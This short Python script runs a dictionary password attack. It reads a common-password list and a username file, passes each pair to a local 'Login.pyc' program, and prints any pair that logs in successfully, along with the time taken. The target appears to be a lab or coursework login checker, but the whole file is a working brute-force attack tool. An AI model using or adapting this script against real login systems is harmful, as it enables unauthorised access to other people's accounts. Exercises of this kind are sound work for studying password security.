import time 
import subprocess

file = open("MostCommonPWs", "r")
start = time.time()

fileUser = open("gang", "r")
username = [line.strip() for line in fileUser]
pw = [line.strip() for line in file]

for password in pw:
    for user in username:

        

        check = subprocess.run(["python3", "Login.pyc", user, password], capture_output=True, text=True)

        if "Login successful." in check.stdout:
            print(f"Password found for {user}: {password}")
            break 
            

end = time.time()
tot  =  end - start
print(f"Time taken:{tot}")

    
    

